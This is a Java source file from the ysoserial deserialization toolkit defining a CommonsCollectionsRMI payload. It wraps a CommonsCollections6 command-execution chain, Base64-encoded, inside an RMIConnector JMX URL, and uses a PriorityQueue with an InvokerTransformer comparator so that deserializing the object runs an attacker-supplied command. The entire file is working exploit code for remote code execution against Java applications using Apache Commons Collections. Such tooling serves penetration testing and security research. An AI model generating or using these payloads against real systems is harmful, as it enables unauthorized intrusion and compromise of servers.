package ysoserial.payloads;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.Serializer;
import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.Serializable;
import java.util.Base64;
import java.util.HashMap;
import java.util.PriorityQueue;

import static ysoserial.payloads.util.Reflections.setFieldValue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.2.1","org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.CRILWA })
public class CommonsCollectionsRMI extends PayloadRunner implements ObjectPayload<Serializable> {

    public Serializable getObject(final String command) throws Exception {
        InvokerTransformer transformer=new InvokerTransformer("connect",null,null);
        CommonsCollections6 commonsCollections6 = new CommonsCollections6();
        Serializable serializable = commonsCollections6.getObject(command);
        Serializer serializer = new Serializer(serializable);
        String base64 = Base64.getEncoder().encodeToString(serializer.call());
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        setFieldValue(jmxServiceURL, "urlPath", "/stub/"+base64);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, new HashMap<>());
        TransformingComparator transformer_comparator = new TransformingComparator(transformer);
        //触发漏洞
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);

        //设置comparator属性
        setFieldValue(queue,"comparator",transformer_comparator);
        //设置queue属性,队列至少需要2个元素
        Object[] objects = new Object[]{rmiConnector, rmiConnector};
        setFieldValue(queue,"queue",objects);
        return queue;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsRMI.class, args);
    }
}
